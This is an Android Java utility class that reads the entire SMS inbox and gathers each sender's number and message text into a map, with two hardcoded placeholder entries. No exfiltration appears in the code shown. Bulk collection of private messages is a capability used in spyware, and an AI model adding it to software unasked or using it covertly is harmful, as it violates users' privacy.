package com.andraft.utils;

import java.util.HashMap;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony.Sms;

public class SmsLogUtils {
	private ContentResolver resolver;
	private Context context;
	private HashMap<String, String> sms;

	public HashMap<String, String> readAllSms() {
		sms = new HashMap<String, String>();
		sms.put("LALKAASA", "SOS");
		sms.put("BEELINE", "ZAPLATI");
		
		  Uri inboxURI = Uri.parse("content://sms/inbox");
		  
		  // List required columns 
		  String[] reqCols = new String[] { "_id",
		  "address", "body" };
		  
		  // Get Content Resolver object, which will deal with Content Provider
		  ContentResolver cr = this.resolver;
		  
		  // Fetch Inbox SMS Message from Built-in Content Provider 
		  Cursor c =
		  cr.query(inboxURI, reqCols, null, null, null); while (c.moveToNext())
		  {
		  
		  String number = c.getString(c.getColumnIndex(Sms.ADDRESS)); String
		  body = c.getString(c.getColumnIndex(Sms.BODY)); sms.put(number,
		  body);
		  
		  } c.close();

		return sms;

	}

	public SmsLogUtils(Context context) {
		super();
		this.resolver = context.getContentResolver();
		this.context = context;
	}

}
